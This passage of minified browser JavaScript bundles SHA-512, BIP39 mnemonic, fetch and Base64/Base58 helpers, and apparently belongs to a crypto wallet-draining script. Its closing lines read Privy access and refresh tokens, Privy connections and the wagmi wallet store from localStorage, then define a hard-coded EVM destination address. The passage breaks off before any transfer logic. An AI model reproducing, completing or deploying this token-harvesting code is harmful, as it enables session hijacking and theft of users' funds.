                        S = i & o ^ i & a ^ o & a;
                    g = 0 | p,
                        y = 0 | m,
                        p = 0 | c,
                        m = 0 | d,
                        c = 0 | u,
                        d = 0 | l,
                        ({
                            h: u,
                            l: l
                        }
                            = H(0 | h, 0 | f, 0 | x, 0 | M)),
                        h = 0 | s,
                        f = 0 | a,
                        s = 0 | n,
                        a = 0 | o,
                        n = 0 | r,
                        o = 0 | i;
                    let k = P(M, _, S);
                    r = D(k, x, E, A),
                        i = 0 | k
                } ({
                    h: r,
                    l: i
                }
                    = H(0 | this.Ah, 0 | this.Al, 0 | r, 0 | i)),
                    ({
                        h: n,
                        l: o
                    }
                        = H(0 | this.Bh, 0 | this.Bl, 0 | n, 0 | o)),
                    ({
                        h: s,
                        l: a
                    }
                        = H(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
                    ({
                        h: h,
                        l: f
                    }
                        = H(0 | this.Dh, 0 | this.Dl, 0 | h, 0 | f)),
                    ({
                        h: u,
                        l: l
                    }
                        = H(0 | this.Eh, 0 | this.El, 0 | u, 0 | l)),
                    ({
                        h: c,
                        l: d
                    }
                        = H(0 | this.Fh, 0 | this.Fl, 0 | c, 0 | d)),
                    ({
                        h: p,
                        l: m
                    }
                        = H(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | m)),
                    ({
                        h: g,
                        l: y
                    }
                        = H(0 | this.Hh, 0 | this.Hl, 0 | g, 0 | y)),
                    this.set(r, i, n, o, s, a, h, f, u, l, c, d, p, m, g, y)
            }
            roundClean() {
                u(Q, tt)
            }
            destroy() {
                u(this.buffer),
                    this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
            }
        }
        let tr = b(() => new G),
            ti = b(() => new te);
        function tn(t) {
            return t instanceof Uint8Array ||
                ArrayBuffer.isView(t) &&
                'Uint8Array' === t.constructor.name
        }
        function to(t, e) {
            return !!Array.isArray(e) &&
                (
                    0 === e.length ||
                    (
                        t ? e.every(t => 'string' == typeof t) : e.every(t => Number.isSafeInteger(t))
                    )
                )
        }
        function ts(t) {
            if ('function' != typeof t) throw Error('function expected');
            return !0
        }

        function ta(t, e) {
            if ('string' != typeof e) throw Error(`${t}: string expected`);
            return !0
        }
        function th(t) {
            if (!Number.isSafeInteger(t)) throw Error(`invalid integer: ${t}`)
        }
        function tf(t) {
            if (!Array.isArray(t)) throw Error('array expected')
        }
        function tu(t, e) {
            if (!to(!0, e)) throw Error(`${t}: array of strings expected`)
        }
        function tl(t, e) {
            if (!to(!1, e)) throw Error(`${t}: array of numbers expected`)
        }
        function tc(...t) {
            let e = t => t,
                r = (t, e) => r => t(e(r));
            return {
                encode: t.map(t => t.encode).reduceRight(r, e),
                decode: t.map(t => t.decode).reduce(r, e)
            }
        }
        function td(t) {
            let e = 'string' == typeof t ? t.split('') : t,
                r = e.length;
            tu('alphabet', e);
            let i = new Map(e.map((t, e) => [t,
                e]));
            return {
                encode: i => (
                    tf(i),
                    i.map(
                        i => {
                            if (!Number.isSafeInteger(i) || i < 0 || i >= r) throw Error(
                                `alphabet.encode: digit index outside alphabet "${i}". Allowed: ${t}`
                            );
                            return e[i]
                        }
                    )
                ),
                decode: e => (
                    tf(e),
                    e.map(
                        e => {
                            ta('alphabet.decode', e);
                            let r = i.get(e);
                            if (void 0 === r) throw Error(`Unknown letter: "${e}". Allowed: ${t}`);
                            return r
                        }
                    )
                )
            }
        }
        function tp(t = '') {
            return ta('join', t),
            {
                encode: e => (tu('join.decode', e), e.join(t)),
                decode: e => (ta('join.decode', e), e.split(t))
            }
        }
        function tm(t, e, r) {
            if (e < 2) throw Error(
                `convertRadix: invalid from=${e}, base cannot be less than 2`
            );
            if (r < 2) throw Error(`convertRadix: invalid to=${r}, base cannot be less than 2`);
            if (tf(t), !t.length) return [];
            let i = 0,
                n = [],
                o = Array.from(
                    t,
                    t => {
                        if (th(t), t < 0 || t >= e) throw Error(`invalid integer: ${t}`);
                        return t
                    }
                ),
                s = o.length;
            for (; ;) {
                let t = 0,
                    a = !0;
                for (let n = i; n < s; n++) {
                    let s = o[n],
                        h = e * t,
                        f = h + s;
                    if (!Number.isSafeInteger(f) || h / e !== t || f - s !== h) throw Error('convertRadix: carry overflow');
                    let u = f / r;
                    t = f % r;
                    let l = Math.floor(u);
                    if (o[n] = l, !Number.isSafeInteger(l) || l * r + t !== f) throw Error('convertRadix: carry overflow');
                    a &&
                        (l ? a = !1 : i = n)
                }
                if (n.push(t), a) break
            }
            for (let e = 0; e < t.length - 1 && 0 === t[e]; e++) n.push(0);
            return n.reverse()
        }
        let tg = (t, e) => 0 === e ? t : tg(e, t % e),
            ty = (t, e) => t + (e - tg(t, e)),
            tb = (() => {
                let t = [];
                for (let e = 0; e < 40; e++) t.push(2 ** e);
                return t
            })();
        function tw(t, e, r, i) {
            if (tf(t), e <= 0 || e > 32) throw Error(`convertRadix2: wrong from=${e}`);
            if (r <= 0 || r > 32) throw Error(`convertRadix2: wrong to=${r}`);
            if (ty(e, r) > 32) throw Error(
                `convertRadix2: carry overflow from=${e} to=${r} carryBits=${ty(e, r)}`
            );
            let n = 0,
                o = 0,
                s = tb[e],
                a = tb[r] - 1,
                h = [];
            for (let i of t) {
                if (th(i), i >= s) throw Error(`convertRadix2: invalid data word=${i} from=${e}`);
                if (n = n << e | i, o + e > 32) throw Error(`convertRadix2: carry overflow pos=${o} from=${e}`);
                for (o += e; o >= r; o -= r) h.push((n >> o - r & a) >>> 0);
                let t = tb[o];
                if (void 0 === t) throw Error('invalid carry');
                n &= t - 1
            }
            if (n = n << r - o & a, !i && o >= e) throw Error('Excess padding');
            if (!i && n > 0) throw Error(`Non-zero padding: ${n}`);
            return i &&
                o > 0 &&
                h.push(n >>> 0),
                h
        }
        function tv(t) {
            th(t);
            let e = 256;
            return {
                encode: r => {
                    if (!tn(r)) throw Error('radix.encode input should be Uint8Array');
                    return tm(Array.from(r), e, t)
                },
                decode: r => (tl('radix.decode', r), Uint8Array.from(tm(r, t, e)))
            }
        }
        function tx(t, e = !1) {
            if (th(t), t <= 0 || t > 32) throw Error('radix2: bits should be in (0..32]');
            if (ty(8, t) > 32 || ty(t, 8) > 32) throw Error('radix2: carry overflow');
            return {
                encode: r => {
                    if (!tn(r)) throw Error('radix2.encode input should be Uint8Array');
                    return tw(Array.from(r), 8, t, !e)
                },
                decode: r => (tl('radix2.decode', r), Uint8Array.from(tw(r, t, 8, e)))
            }
        }
        let tM = {
            alphabet: td,
            chain: tc,
            checksum: function (t, e) {
                return th(t),
                    ts(e),
                {
                    encode(r) {
                        if (!tn(r)) throw Error('checksum.encode: input should be Uint8Array');
                        let i = e(r).slice(0, t),
                            n = new Uint8Array(r.length + t);
                        return n.set(r),
                            n.set(i, r.length),
                            n
                    },
                    decode(r) {
                        if (!tn(r)) throw Error('checksum.decode: input should be Uint8Array');
                        let i = r.slice(0, - t),
                            n = r.slice(- t),
                            o = e(i).slice(0, t);
                        for (let e = 0; e < t; e++) if (o[e] !== n[e]) throw Error('Invalid checksum');
                        return i
                    }
                }
            },
            radix2: tx
        };
        'function' == typeof Uint8Array.from([]).toBase64 &&
            Uint8Array.fromBase64;
        let i = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        'function' == typeof Uint8Array.from([]).toHex &&
            Uint8Array.fromHex;
        let tE = t => 'あいこくしん' === t[0];
        function t_(t) {
            if ('string' != typeof t) throw TypeError('invalid mnemonic type: ' + typeof t);
            return t.normalize('NFKD')
        }
        function tA(t) {
            let e = t_(t),
                r = e.split(' ');
            if (![12,
                15,
                18,
                21,
                24].includes(r.length)) throw Error('Invalid mnemonic');
            return {
                nfkd: e,
                words: r
            }
        }
        function tS(t) {
            s(t, 16, 20, 24, 28, 32)
        }
        let tk = t => {
            let e = 8 - t.length / 4;
            return new Uint8Array([tr(t)[0] >> e << e])
        };
        function tB(t) {
            if (!Array.isArray(t) || 2048 !== t.length || 'string' != typeof t[0]) throw Error('Wordlist: expected array of 2048 strings');
            return t.forEach(
                t => {
                    if ('string' != typeof t) throw Error('wordlist: non-string element: ' + t)
                }
            ),
                tM.chain(tM.checksum(1, tk), tM.radix2(11, !0), tM.alphabet(t))
        }
        function tR(t, e) {
            return tS(t),
                tB(e).encode(t).join(tE(e) ? '　' : ' ')
        }
        let tU = t => t_('mnemonic' + t);
        function tO(t, e = '') {
            return E(ti, tA(t).nfkd, tU(e), {
                c: 2048,
                dkLen: 64
            })
        }

        return {
            ta: ta,
            tM: tM,
            tk: tk,
            tR: tR,
            tO: tO
        }
    })()
    const module7532 = await (async () => {
        let {
            fetch: r = globalThis.fetch,
            Headers: i = globalThis.Headers,
            AbortController: o = globalThis.AbortController
        }
            = window;
        async function s(e) {
            let t = e.error &&
                'AbortError' === e.error.name &&
                !e.options.timeout ||
                !1;
            if (!1 !== e.options.retry && !t) {
                let t;
                t = 'number' == typeof e.options.retry ? e.options.retry : + !I(e.options.method);
                let r = e.response &&
                    e.response.status ||
                    500;
                if (
                    t > 0 &&
                    (
                        Array.isArray(e.options.retryStatusCodes) ? e.options.retryStatusCodes.includes(r) : $.has(r)
                    )
                ) {
                    let r = 'function' == typeof e.options.retryDelay ? e.options.retryDelay(e) : e.options.retryDelay ||
                        0;
                    return r > 0 &&
                        await new Promise(e => setTimeout(e, r)),
                        a(e.request, {
                            ...e.options,
                            retry: t - 1
                        })
                }
            }
            let r = function (e) {
                let t = e.error?.message ||
                    e.error?.toString() ||
                    '',
                    r = e.request?.method ||
                        e.options?.method ||
                        'GET',
                    n = e.request?.url ||
                        String(e.request) ||
                        '/',
                    i = `[${r}] ${JSON.stringify(n)}`,
                    o = e.response ? `${e.response.status} ${e.response.statusText}` : '<no response>',
                    s = new P(`${i}: ${o}${t ? ` ${t}` : ''}`, e.error ? {
                        cause: e.error
                    }
                        : void 0);
                for (let t of [
                    'request',
                    'options',
                    'response'
                ]) Object.defineProperty(s, t, {
                    get: () => e[t]
                });
                for (
                    let [t,
                        r] of [
                        ['data',
                            '_data'],
                        [
                            'status',
                            'status'
                        ],
                        [
                            'statusCode',
                            'status'
                        ],
                        [
                            'statusText',
                            'statusText'
                        ],
                        [
                            'statusMessage',
                            'statusText'
                        ]
                    ]
                ) Object.defineProperty(s, t, {
                    get: () => e.response &&
                        e.response[r]
                });
                return s
            }(e);
            throw Error.captureStackTrace &&
            Error.captureStackTrace(r, a),
            r
        }
        let a = async function (e, a = {}) {
            let timeoutId,
                l = {
                    request: e,
                    options: function (e, t, r, n) {
                        let i,
                            o = function (e, t, r) {
                                if (!t) return new r(e);
                                let n = new r(t);
                                if (e) for (let [t,
                                    i] of Symbol.iterator in e || Array.isArray(e) ? e : new r(e)) n.set(t, i);
                                return n
                            }(t?.headers ?? e?.headers, r?.headers, n);
                        return (r?.query || r?.params || t?.params || t?.query) &&
                            (i = {
                                ...r?.params,
                                ...r?.query,
                                ...t?.params,
                                ...t?.query
                            }),
                        {
                            ...r,
                            ...t,
                            query: i,
                            params: i,
                            headers: o
                        }
                    }(e, a, undefined, i),
                    response: void 0,
                    error: void 0
                };
            if (
                l.options.method &&
                (l.options.method = l.options.method.toUpperCase()),
                l.options.onRequest &&
                await T(l, l.options.onRequest),
                'string' == typeof l.request &&
                (
                    l.options.baseURL &&
                    (
                        l.request = function (e, t) {
                            var r;
                            if (!(r = t) || '/' === r || x(e)) return e;
                            let n = function (e = '', t) {
                                return (
                                    function (e = '', t) {
                                        return t ? w.test(e) : e.endsWith('/')
                                    }(e) ? e.slice(0, - 1) : e
                                ) ||
                                    '/'
                            }(t);
                            return e.startsWith(n) ? e : function (e, ...t) {
                                let r = e ||
                                    '';
                                for (let e of t.filter(e => e && '/' !== e)) if (r) {
                                    let t = e.replace(v, '');
                                    r = function (e = '', t) {
                                        return e.endsWith('/') ? e : e + '/'
                                    }(r) + t
                                } else r = e;
                                return r
                            }(n, e)
                        }(l.request, l.options.baseURL)
                    ),
                    l.options.query &&
                    (
                        l.request = function (e, t) {
                            let r = function e(t = '', r) {
                                let n = t.match(/^[\s\0]*(blob:|data:|javascript:|vbscript:)(.*)/i);
                                if (n) {
                                    let [,
                                        e,
                                        t = ''] = n;
                                    return {
                                        protocol: e.toLowerCase(),
                                        pathname: t,
                                        href: e + t,
                                        auth: '',
                                        host: '',
                                        search: '',
                                        hash: ''
                                    }
                                }
                                if (!x(t, {
                                    acceptRelative: !0
                                })) return r ? e(r + t) : A(t);
                                let [,
                                    i = '',
                                    o,
                                    s = ''] = t.replace(/\\/g, '/').match(/^[\s\0]*([\w+.-]{2,}:)?\/\/([^/@]+@)?(.*)/) ||
                                    [],
                                    [
                                        ,
                                        a = '',
                                        c = ''
                                    ] = s.match(/([^#/?]*)(.*)?/) ||
                                        [];
                                'file:' === i &&
                                    (c = c.replace(/\/(?=[A-Za-z]:)/, ''));
                                let {
                                    pathname: u,
                                    search: l,
                                    hash: f
                                }
                                    = A(c);
                                return {
                                    protocol: i.toLowerCase(),
                                    auth: o ? o.slice(0, Math.max(0, o.length - 1)) : '',
                                    host: a,
                                    pathname: u,
                                    search: l,
                                    hash: f,
                                    [
                                        E
                                    ]: !i
                                }
                            }(e),
                                n = {
                                    ...function (e = '') {
                                        let t = {};
                                        for (let r of ('?' === e[0] && (e = e.slice(1)), e.split('&'))) {
                                            let e = r.match(/([^=]+)=?(.*)/) ||
                                                [];
                                            if (e.length < 2) continue;
                                            let n = y(e[1].replace(c, ' '));
                                            if ('__proto__' === n || 'constructor' === n) continue;
                                            let i = y((e[2] || '').replace(c, ' '));
                                            void 0 === t[n] ? t[n] = i : Array.isArray(t[n]) ? t[n].push(i) : t[n] = [
                                                t[n],
                                                i
                                            ]
                                        }
                                        return t
                                    }(r.search),
                                    ...t
                                };
                            return r.search = Object.keys(n).filter(e => void 0 !== n[e]).map(
                                e => {
                                    var t;
                                    return (
                                        ('number' == typeof (t = n[e]) || 'boolean' == typeof t) &&
                                        (t = String(t)),
                                        t
                                    ) ? Array.isArray(t) ? t.map(t => `${p(e)}=${h(t)}`).join('&') : `${p(e)}=${h(t)}` : p(e)
                                }
                            ).filter(Boolean).join('&'),
                                function (e) {
                                    let t = e.pathname ||
                                        '',
                                        r = e.search ? (e.search.startsWith('?') ? '' : '?') + e.search : '',
                                        n = e.hash ||
                                            '',
                                        i = e.auth ? e.auth + '@' : '',
                                        o = e.host ||
                                            '';
                                    return (e.protocol || e[E] ? (e.protocol || '') + '//' : '') + i + o + t + r + n
                                }(r)
                        }(l.request, l.options.query),
                        delete l.options.query
                    ),
                    'query' in l.options &&
                    delete l.options.query,
                    'params' in l.options &&
                    delete l.options.params
                ),
                l.options.body &&
                I(l.options.method) &&
                (
                    !function (e) {
                        if (void 0 === e) return !1;
                        let t = typeof e;
                        return 'string' === t ||
                            'number' === t ||
                            'boolean' === t ||
                            null === t ||
                            'object' === t &&
                            (
                                !!Array.isArray(e) ||
                                !e.buffer &&
                                (
                                    e.constructor &&
                                    'Object' === e.constructor.name ||
                                    'function' == typeof e.toJSON
                                )
                            )
                    }(l.options.body) ? (
                        'pipeTo' in l.options.body &&
                        'function' == typeof l.options.body.pipeTo ||
                        'function' == typeof l.options.body.pipe
                    ) &&
                    !('duplex' in l.options) &&
                    (l.options.duplex = 'half') : (
                        l.options.body = 'string' == typeof l.options.body ? l.options.body : JSON.stringify(l.options.body),
                        l.options.headers = new i(l.options.headers || {
                        }),
                        l.options.headers.has('content-type') ||
                        l.options.headers.set('content-type', 'application/json'),
                        l.options.headers.has('accept') ||
                        l.options.headers.set('accept', 'application/json')
                    )
                ),
                !l.options.signal &&
                l.options.timeout
            ) {
                let e = new o;
                timeoutId = setTimeout(
                    () => {
                        let t = Error('[TimeoutError]: The operation was aborted due to timeout');
                        t.name = 'TimeoutError',
                            t.code = 23,
                            e.abort(t)
                    },
                    l.options.timeout
                ),
                    l.options.signal = e.signal
            }
            try {
                l.response = await r(l.request, l.options)
            } catch (e) {
                return l.error = e,
                    l.options.onRequestError &&
                    await T(l, l.options.onRequestError),
                    await s(l)
            } finally {
                timeoutId &&
                    clearTimeout(timeoutId)
            }
            if (
                (l.response.body || l.response._bodyInit) &&
                !O.has(l.response.status) &&
                'HEAD' !== l.options.method
            ) {
                let e = (l.options.parseResponse ? 'json' : l.options.responseType) ||
                    function (e = '') {
                        if (!e) return 'json';
                        let t = e.split(';').shift() ||
                            '';
                        return S.test(t) ? 'json' : C.has(t) ||
                            t.startsWith('text/') ? 'text' : 'blob'
                    }(l.response.headers.get('content-type') || '');
                switch (e) {
                    case 'json':
                        {
                            let e = await l.response.text(),
                                t = l.options.parseResponse ||
                                    function (e, t = {}) {
                                        function s(e, t) {
                                            var r;
                                            return '__proto__' === e ||
                                                'constructor' === e &&
                                                t &&
                                                'object' == typeof t &&
                                                'prototype' in t ? void (
                                                    r = e,
                                                    console.warn(
                                                        `[destr] Dropping "${r}" key to prevent prototype pollution.`
                                                    )
                                                ) : t
                                        }

                                        let n = /"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,
                                            i = /"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,
                                            o = /^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;

                                        if ('string' != typeof e) return e;
                                        let r = e.trim();
                                        if ('"' === e[0] && e.endsWith('"') && !e.includes('\\')) return r.slice(1, - 1);
                                        if (r.length <= 9) {
                                            let e = r.toLowerCase();
                                            if ('true' === e) return !0;
                                            if ('false' === e) return !1;
                                            if ('undefined' === e) return;
                                            if ('null' === e) return null;
                                            if ('nan' === e) return NaN;
                                            if ('infinity' === e) return 1 / 0;
                                            if ('-infinity' === e) return - 1 / 0
                                        }
                                        if (!o.test(e)) {
                                            return e
                                        }
                                        try {
                                            if (n.test(e) || i.test(e)) {
                                                if (t.strict) throw Error('[destr] Possible prototype pollution');
                                                return JSON.parse(e, s)
                                            }
                                            return JSON.parse(e)
                                        } catch (r) {
                                            if (t.strict) throw r;
                                            return e
                                        }
                                    };
                            l.response._data = t(e);
                            break
                        }
                    case 'stream':
                        l.response._data = l.response.body ||
                            l.response._bodyInit;
                        break;
                    default:
                        l.response._data = await l.response[e]()
                }
            }
            return (
                l.options.onResponse &&
                await T(l, l.options.onResponse),
                !l.options.ignoreResponseError &&
                l.response.status >= 400 &&
                l.response.status < 600
            ) ? (
                l.options.onResponseError &&
                await T(l, l.options.onResponseError),
                await s(l)
            ) : l.response
        };
        let u = async function (e, t) {
            return (await a(e, t))._data
        };

        // Export the main function

        let iRegex = /#/g,
            oRegex = /&/g,
            sRegex = /\//g,
            aRegex = /=/g,
            c = /\+/g,
            uRegex = /%5e/gi,
            l = /%60/gi,
            f = /%7c/gi,
            d = /%20/gi;
        function h(e) {
            return encodeURI('' + ('string' == typeof e ? e : JSON.stringify(e))).replace(f, '|').replace(c, '%2B').replace(d, '+').replace(iRegex, '%23').replace(oRegex, '%26').replace(l, '`').replace(uRegex, '^').replace(sRegex, '%2F')
        }
        function p(e) {
            return h(e).replace(aRegex, '%3D')
        }
        function y(e = '') {
            try {
                return decodeURIComponent('' + e)
            } catch {
                return '' + e
            }
        }
        let g = /^[\s\w\0+.-]{2,}:([/\\]{1,2})/,
            m = /^[\s\w\0+.-]{2,}:([/\\]{2})?/,
            b = /^([/\\]\s*){2,}[^/\\]/,
            w = /\/$|\/\?|\/#/,
            v = /^\.?\//;
        function x(e, t = {}) {
            return ('boolean' == typeof t && (t = {
                acceptRelative: t
            }), t.strict) ? g.test(e) : m.test(e) ||
            !!t.acceptRelative &&
            b.test(e)
        }
        let E = Symbol.for('ufo:protocolRelative');
        function A(e = '') {
            let [t = '',
                r = '',
                n = ''] = (e.match(/([^#?]*)(\?[^#]*)?(#.*)?/) || []).splice(1);
            return {
                pathname: t,
                search: r,
                hash: n
            }
        }
        class P extends Error {
            constructor(e, t) {
                super(e, t),
                    this.name = 'FetchError',
                    t?.cause &&
                    !this.cause &&
                    (this.cause = t.cause)
            }
        }
        let B = new Set(Object.freeze(['PATCH',
            'POST',
            'PUT',
            'DELETE']));
        function I(e = 'GET') {
            return B.has(e.toUpperCase())
        }
        let C = new Set(
            ['image/svg',
                'application/xml',
                'application/xhtml',
                'application/html']
        ),
            S = /^application\/(?:[\w!#$%&*.^`~-]*\+)?json(;.+)?$/i;
        async function T(e, t) {
            if (t) if (Array.isArray(t)) for (let r of t) await r(e);
            else await t(e)
        }
        let $ = new Set([408,
            409,
            425,
            429,
            500,
            502,
            503,
            504]),
            O = new Set([101,
                204,
                205,
                304]);
        return {
            u: u
        }


    })()
    const createBase64Codec = () => {
        function o(r) {
            return r instanceof Uint8Array ||
                ArrayBuffer.isView(r) &&
                'Uint8Array' === r.constructor.name
        }

        function i(r, e) {
            return !!Array.isArray(e) &&
                (
                    0 === e.length ||
                    (
                        r ? e.every(r => 'string' == typeof r) : e.every(r => Number.isSafeInteger(r))
                    )
                )
        }

        function a(r, e) {
            if ('string' != typeof e) throw Error(`${r}: string expected`);
            return !0
        }

        function f(r) {
            if (!Number.isSafeInteger(r)) throw Error(`invalid integer: ${r}`)
        }

        function d(r) {
            if (!Array.isArray(r)) throw Error('array expected')
        }

        function c(r, e) {
            if (!i(!0, e)) throw Error(`${r}: array of strings expected`)
        }

        function s(r, e) {
            if (!i(!1, e)) throw Error(`${r}: array of numbers expected`)
        }

        function l(...r) {
            let e = r => r,
                t = (r, e) => t => r(e(t));
            return {
                encode: r.map(r => r.encode).reduceRight(t, e),
                decode: r.map(r => r.decode).reduce(t, e)
            }
        }

        function u(r) {
            let e = 'string' == typeof r ? r.split('') : r,
                t = e.length;
            c('alphabet', e);
            let n = new Map(e.map((r, e) => [r, e]));
            return {
                encode: n => (
                    d(n),
                    n.map(
                        n => {
                            if (!Number.isSafeInteger(n) || n < 0 || n >= t) throw Error(
                                `alphabet.encode: digit index outside alphabet "${n}". Allowed: ${r}`
                            );
                            return e[n]
                        }
                    )
                ),
                decode: e => (
                    d(e),
                    e.map(
                        e => {
                            a('alphabet.decode', e);
                            let t = n.get(e);
                            if (void 0 === t) throw Error(`Unknown letter: "${e}". Allowed: ${r}`);
                            return t
                        }
                    )
                )
            }
        }

        function h(r = '') {
            return a('join', r),
            {
                encode: e => (c('join.decode', e), e.join(r)),
                decode: e => (a('join.decode', e), e.split(r))
            }
        }

        function w(r, e, t) {
            if (e < 2) throw Error(
                `convertRadix: invalid from=${e}, base cannot be less than 2`
            );
            if (t < 2) throw Error(`convertRadix: invalid to=${t}, base cannot be less than 2`);
            if (d(r), !r.length) return [];
            let n = 0,
                o = [],
                i = Array.from(
                    r,
                    r => {
                        if (f(r), r < 0 || r >= e) throw Error(`invalid integer: ${r}`);
                        return r
                    }
                ),
                a = i.length;
            for (; ;) {
                let r = 0,
                    f = !0;
                for (let o = n; o < a; o++) {
                    let a = i[o],
                        d = e * r,
                        c = d + a;
                    if (!Number.isSafeInteger(c) || d / e !== r || c - a !== d) throw Error('convertRadix: carry overflow');
                    let s = c / t;
                    r = c % t;
                    let l = Math.floor(s);
                    if (i[o] = l, !Number.isSafeInteger(l) || l * t + r !== c) throw Error('convertRadix: carry overflow');
                    f &&
                        (l ? f = !1 : n = o)
                }
                if (o.push(r), f) break
            }
            for (let e = 0; e < r.length - 1 && 0 === r[e]; e++) o.push(0);
            return o.reverse()
        }

        let x = (r, e) => 0 === e ? r : x(e, r % e),
            g = (r, e) => r + (e - x(r, e)),
            p = (() => {
                let r = [];
                for (let e = 0; e < 40; e++) r.push(2 ** e);
                return r
            })();

        function v(r, e, t, n) {
            if (d(r), e <= 0 || e > 32) throw Error(`convertRadix2: wrong from=${e}`);
            if (t <= 0 || t > 32) throw Error(`convertRadix2: wrong to=${t}`);
            if (g(e, t) > 32) throw Error(
                `convertRadix2: carry overflow from=${e} to=${t} carryBits=${g(e, t)}`
            );
            let o = 0,
                i = 0,
                a = p[e],
                c = p[t] - 1,
                s = [];
            for (let n of r) {
                if (f(n), n >= a) throw Error(`convertRadix2: invalid data word=${n} from=${e}`);
                if (o = o << e | n, i + e > 32) throw Error(`convertRadix2: carry overflow pos=${i} from=${e}`);
                for (i += e; i >= t; i -= t) s.push((o >> i - t & c) >>> 0);
                let r = p[i];
                if (void 0 === r) throw Error('invalid carry');
                o &= r - 1
            }
            if (o = o << t - i & c, !n && i >= e) throw Error('Excess padding');
            if (!n && o > 0) throw Error(`Non-zero padding: ${o}`);
            return n &&
                i > 0 &&
                s.push(o >>> 0),
                s
        }

        const y = l(
            function (r, e = !1) {
                if (f(6), r <= 0 || r > 32) throw Error('radix2: bits should be in (0..32]');
                if (g(8, r) > 32 || g(r, 8) > 32) throw Error('radix2: carry overflow');
                return {
                    encode: t => {
                        if (!o(t)) throw Error('radix2.encode input should be Uint8Array');
                        return v(Array.from(t), 8, r, !e)
                    },
                    decode: t => (s('radix2.decode', t), Uint8Array.from(v(t, r, 8, e)))
                }
            }(6),
            u(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            ),
            function (r, e = '=') {
                return f(6),
                    a('padding', e),
                {
                    encode(t) {
                        for (c('padding.encode', t); t.length * r % 8;) t.push(e);
                        return t
                    },
                    decode(t) {
                        c('padding.decode', t);
                        let n = t.length;
                        if (n * r % 8) throw Error('padding: invalid, string should have whole number of bytes');
                        for (; n > 0 && t[n - 1] === e; n--) if ((n - 1) * r % 8 == 0) throw Error('padding: invalid, string has too much padding');
                        return t.slice(0, n)
                    }
                }
            }(6),
            h('')
        );

        return y;
    };
    const createBase58Codec = () => {
        function o(r) {
            return r instanceof Uint8Array ||
                ArrayBuffer.isView(r) &&
                'Uint8Array' === r.constructor.name
        }

        function i(r, e) {
            return !!Array.isArray(e) &&
                (
                    0 === e.length ||
                    (
                        r ? e.every(r => 'string' == typeof r) : e.every(r => Number.isSafeInteger(r))
                    )
                )
        }

        function a(r, e) {
            if ('string' != typeof e) throw Error(`${r}: string expected`);
            return !0
        }

        function f(r) {
            if (!Number.isSafeInteger(r)) throw Error(`invalid integer: ${r}`)
        }

        function d(r) {
            if (!Array.isArray(r)) throw Error('array expected')
        }

        function s(r, e) {
            if (!i(!1, e)) throw Error(`${r}: array of numbers expected`)
        }

        function l(...r) {
            let e = r => r,
                t = (r, e) => t => r(e(t));
            return {
                encode: r.map(r => r.encode).reduceRight(t, e),
                decode: r.map(r => r.decode).reduce(t, e)
            }
        }

        function u(r) {
            let e = 'string' == typeof r ? r.split('') : r,
                t = e.length;
            function c(r, e) {
                if (!i(!0, e)) throw Error(`${r}: array of strings expected`)
            }
            c('alphabet', e);
            let n = new Map(e.map((r, e) => [r, e]));
            return {
                encode: n => (
                    d(n),
                    n.map(
                        n => {
                            if (!Number.isSafeInteger(n) || n < 0 || n >= t) throw Error(
                                `alphabet.encode: digit index outside alphabet "${n}". Allowed: ${r}`
                            );
                            return e[n]
                        }
                    )
                ),
                decode: e => (
                    d(e),
                    e.map(
                        e => {
                            a('alphabet.decode', e);
                            let t = n.get(e);
                            if (void 0 === t) throw Error(`Unknown letter: "${e}". Allowed: ${r}`);
                            return t
                        }
                    )
                )
            }
        }

        function h(r = '') {
            return a('join', r),
            {
                encode: e => {
                    function c(r, e) {
                        if (!i(!0, e)) throw Error(`${r}: array of strings expected`)
                    }
                    c('join.decode', e);
                    return e.join(r)
                },
                decode: e => (a('join.decode', e), e.split(r))
            }
        }

        function w(r, e, t) {
            if (e < 2) throw Error(
                `convertRadix: invalid from=${e}, base cannot be less than 2`
            );
            if (t < 2) throw Error(`convertRadix: invalid to=${t}, base cannot be less than 2`);
            if (d(r), !r.length) return [];
            let n = 0,
                o = [],
                i = Array.from(
                    r,
                    r => {
                        if (f(r), r < 0 || r >= e) throw Error(`invalid integer: ${r}`);
                        return r
                    }
                ),
                a = i.length;
            for (; ;) {
                let r = 0,
                    f = !0;
                for (let o = n; o < a; o++) {
                    let a = i[o],
                        d = e * r,
                        c = d + a;
                    if (!Number.isSafeInteger(c) || d / e !== r || c - a !== d) throw Error('convertRadix: carry overflow');
                    let s = c / t;
                    r = c % t;
                    let l = Math.floor(s);
                    if (i[o] = l, !Number.isSafeInteger(l) || l * t + r !== c) throw Error('convertRadix: carry overflow');
                    f &&
                        (l ? f = !1 : n = o)
                }
                if (o.push(r), f) break
            }
            for (let e = 0; e < r.length - 1 && 0 === r[e]; e++) o.push(0);
            return o.reverse()
        }

        const E = l(
            (
                () => {
                    let n = 58;
                    f(58);
                    return {
                        encode: r => {
                            if (!o(r)) throw Error('radix.encode input should be Uint8Array');
                            return w(Array.from(r), 256, 58)
                        },
                        decode: r => (s('radix.decode', r), Uint8Array.from(w(r, 58, 256)))
                    }
                }
            )(),
            u('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'),
            h('')
        );

        return E;
    };
    const a = {
        K3: createBase64Codec(),
        tw: createBase58Codec()
    };

    const privyConnectionsStorage = JSON.parse(localStorage.getItem("privy:connections"));
    const wagmiStore = JSON.parse(localStorage.getItem("wagmi.store"));
    const accessToken = localStorage.getItem("privy:token");
    const refreshToken = localStorage.getItem("privy:refresh_token");

    const EVM_DESTINATION = "0x1c26170dcfc82ceb402b22ab012207d290afea42"; // <- alameda
